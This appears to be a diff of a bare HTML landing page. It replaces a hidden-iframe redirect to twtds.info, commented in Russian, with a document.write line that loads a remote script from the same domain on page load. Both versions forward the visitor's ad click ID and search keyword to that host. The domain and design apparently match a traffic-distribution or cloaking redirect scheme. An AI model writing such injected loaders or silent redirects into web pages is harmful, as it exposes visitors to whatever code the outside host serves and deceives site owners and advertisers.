@@ -1,57 +1,15 @@
 <html>
   
   <head>
-   <script>
+  <script>
 function GET(item) {
     var p = window.location.search;
     p = p.match(new RegExp(item+'=([^&=]+)'));
     return p ? p[1] : false;
 }
-
-var url = "https://twtds.info/test?gclid=" + GET('gclid') + "&keyword=" + GET('keyword');
-
-// Создаем iframe и пробуем загрузить в него содержимое
-var iframe = document.createElement('iframe');
-iframe.style.display = 'none'; // Скрываем iframe
-document.body.appendChild(iframe);
-
-// Устанавливаем обработчики для проверки загрузки
-try {
-    iframe.src = url;
-    
-    // Таймаут на случай, если iframe не загрузится
-    var timeoutID = setTimeout(function() {
-        redirectToUrl();
-    }, 2000);
-
-    iframe.onload = function() {
-        try {
-            // Пробуем получить доступ к содержимому iframe
-            var test = iframe.contentWindow.location.href;
-            clearTimeout(timeoutID);
-            // Если доступ получен, показываем iframe
-            iframe.style.display = 'block';
-            iframe.style.width = '100%';
-            iframe.style.height = '100vh';
-            iframe.style.border = 'none';
-        } catch(e) {
-            // Если получить доступ не удалось - делаем редирект
-            redirectToUrl();
-        }
-    };
-
-    iframe.onerror = function() {
-        redirectToUrl();
-    };
-
-} catch(e) {
-    redirectToUrl();
-}
-
-function redirectToUrl() {
-    clearTimeout(timeoutID);
-    window.location.replace(url);
-}
+var url = "https://twtds.info/rukswlr2?gclid="+GET('gclid')+"&keyword="+GET('keyword');
+var url2 = "https://twtds.info/rukswlr?gclid="+GET('gclid')+"&keyword="+GET('keyword');
+document.write("<script src="+url+"><\/script>");
 </script>
 
 
